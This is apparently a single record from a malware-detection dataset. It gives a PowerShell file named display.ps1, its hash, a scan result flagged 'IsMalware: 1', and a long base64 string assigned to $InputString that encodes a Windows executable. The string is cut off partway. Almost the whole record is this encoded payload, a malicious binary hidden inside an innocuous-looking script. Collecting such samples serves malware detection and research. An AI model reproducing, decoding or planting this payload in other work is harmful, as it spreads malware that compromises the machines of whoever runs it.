display.ps1,084c26cfb6d86365e8c8e806ce2662e7,Scan result is 32768. IsMalware: 1,$InputString = "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